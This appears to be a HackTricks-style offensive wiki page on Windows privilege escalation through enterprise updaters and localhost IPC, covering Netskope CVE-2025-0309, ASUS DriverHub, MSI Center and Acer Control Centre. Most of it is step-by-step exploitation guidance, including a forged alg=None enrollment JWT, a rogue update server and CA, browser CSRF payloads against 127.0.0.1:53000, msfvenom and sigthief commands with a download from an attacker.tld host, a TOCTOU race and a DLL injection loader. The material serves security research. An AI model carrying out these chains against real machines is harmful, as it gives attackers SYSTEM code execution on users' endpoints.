# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

This page generalizes a class of Windows local privilege escalation chains found in enterprise endpoint agents and updaters that expose a low\-friction IPC surface and a privileged update flow. A representative example is Netskope Client for Windows < R129 (CVE-2025-0309), where a low\-privileged user can coerce enrollment into an attacker\-controlled server and then deliver a malicious MSI that the SYSTEM service installs.

Key ideas you can reuse against similar products:
- Abuse a privileged service’s localhost IPC to force re\-enrollment or reconfiguration to an attacker server.
- Implement the vendor’s update endpoints, deliver a rogue Trusted Root CA, and point the updater to a malicious, “signed” package.
- Evade weak signer checks (CN allow\-lists), optional digest flags, and lax MSI properties.
- If IPC is “encrypted”, derive the key/IV from world\-readable machine identifiers stored in the registry.
- If the service restricts callers by image path/process name, inject into an allow\-listed process or spawn one suspended and bootstrap your DLL via a minimal thread\-context patch.

## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user\-mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) The service starts hitting your rogue server for enrollment/config, e.g.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name\-based, originate the request from a allow\-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow\-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow\-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow\-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver\-enforced tamper rules.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user\-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed\-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in\-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already\-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES\-encrypted) IPC messages and includes the suspended\-process injection to originate from an allow\-listed binary.

## 8) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user\-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker\-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state\-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Even the PowerShell CLI shown below succeeds when the Origin header is spoofed to the trusted value:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 9) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring\-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 9) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

## 10) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.
